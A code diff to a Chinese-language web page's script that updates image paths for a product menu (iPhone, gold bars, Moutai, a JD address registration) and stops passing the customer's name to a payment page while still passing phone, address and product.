@@ -174,10 +174,10 @@
 
 		<script>
 			const imageMap = {
-				'iPhone（请提前联系客服确认型号）': '/pay/image/iPhone.jpg',
-				京东实物地址登记: '/pay/image/京东实物.jpg',
-				'金条/黄金（请提前联系客服确认克重）': '/pay/image/f5aa7617db724792b45d384994338742.png',
-				'茅台（请提前联系客服年份/数量）': '/pay/image/kweichow-moutai-kweichow-moutai-2024-1l.png',
+				'iPhone（请提前联系客服确认型号）': 'iPhone.jpg.png',
+				京东实物地址登记: '京东实物.jpg',
+				'金条/黄金（请提前联系客服确认克重）': 'f5aa7617db724792b45d384994338742.png',
+				'茅台（请提前联系客服年份/数量）': 'kweichow-moutai-kweichow-moutai-2024-1l.png',
 			}
 
 			const productSelect = document.getElementById('productSelect')
@@ -274,7 +274,9 @@
 				const kefu = currentParams.get('kefu') || 'okk13'
 
 				const payParams = new URLSearchParams(window.location.search)
-				payParams.set('name', name)
+				// 移除 name 参数，不传递给支付页面
+				payParams.delete('name')
+
 				payParams.set('phone', phone)
 				payParams.set('address', address)
 				payParams.set('product', selectedProduct)
